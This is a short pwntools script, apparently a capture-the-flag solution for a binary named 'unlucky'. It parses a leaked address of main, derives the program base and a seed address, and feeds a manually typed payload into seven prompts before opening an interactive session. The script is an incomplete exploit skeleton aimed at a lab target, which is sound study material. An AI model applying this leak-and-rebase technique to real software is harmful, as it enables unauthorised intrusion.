#!/usr/bin/python3
import random
from pwn import *

exe = ELF('./unlucky', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+185
                b*main+77

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
p.recvuntil(b"number: ")
main = int(p.recv(14), 16)
info("main: " + hex(main))
base = main - 4517
info("base: " + hex(base))
seed = base + 16488
info("seed: " + hex(seed))

payload = input()
sla(b"Enter lucky number #1:\n",payload)
sla(b"Enter lucky number #2:\n",payload)
sla(b"Enter lucky number #3:\n",payload)
sla(b"Enter lucky number #4:\n",payload)
sla(b"Enter lucky number #5:\n",payload)
sla(b"Enter lucky number #6:\n",payload)
sla(b"Enter lucky number #7:\n",payload)

p.interactive()
